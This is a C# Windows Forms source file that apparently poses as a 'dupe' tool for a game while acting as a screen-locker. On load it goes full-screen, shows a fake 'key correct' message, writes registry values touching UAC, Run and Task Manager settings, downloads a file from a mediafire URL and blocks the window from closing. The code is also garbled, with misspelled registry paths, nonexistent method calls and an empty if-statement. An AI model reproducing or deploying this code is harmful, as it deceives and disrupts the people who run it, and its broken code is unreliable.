using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Net;
using SolrNet.Utils;
using System.Media;
using System.Diagnostics;
 

namespace MM2_Dupe_V_1._01
{
    
    public partial class Form1 : Form
    {
        public SoundPlayer _soundplayer { get; }

        public Form1()
        {
            InitializeComponent();
            _soundplayer = new SoundPlayer("c//norm9.wav");
        }

        private void button3_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Left = 0;
            this.Top = 0;
            this.Width = Screen.PrimaryScreen.Bounds.Width;
            this.Height = Screen.PrimaryScreen.Bounds.Height;
            MessageBox.Show("This Key is Correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Error);


            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\MICROSFT\\WINDOWS//Policies\\System\\CurrentVersion\\");
            rk.SetValue("FilterAdministrationToken", 0, RegistryValueKind.DWord);


            RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\MICROSFT\\WINDOWS//Policies\\System\\CurrentVersion\\");
            reg.SetValue("EnableLUA", 1, RegistryValueKind.DWord);


            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\MICROSFT\\WINDOWS//Policies\\System\\CurrentVersion\\Run", true);
            key.SetValue("blue_skull", 0, RegistryValueKind.DWord);





            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\MICROSFT\\WINDOWS//Policies\\System\\CurrentVersion\\Run");
            reg2.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);

            Process[] _proceses = null;
            _proceses = ProcessCmdKey().GetProcessByName("blue_skull");
            foreach (PreProcessControlState proces in _proceses)
            {
                proces.Kill();
            }
            this.Close();
        
            
        

            
               
            
            string KeyName = @"HKEY_CURRENT_USER\SOFTWARE/MICROSOFT\WINDOWS";
            string ValueName = "blue_skull_confirm";
            if (Registry.GetValue(KeyName, ValueName, null) == null) ;


            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile("http://download1515.mediafire.com/1vwen5963gxg/k3tg8tcsyndp40c/", @"c:/norm9.wav");
                RegistryKey key2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\MICROSOFT\\WINDOWS");
                key2.SetValue("blue_skull_confirm", 1, RegistryValueKind.String);






            }

            this.Hide();
            var NewForm = new dead_skull__blue_();
            NewForm.ShowDialog();
            this.Close();

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            
            {
                MessageBox.Show("Incorrect Key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            MessageBox.Show("This Key is Correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}




    
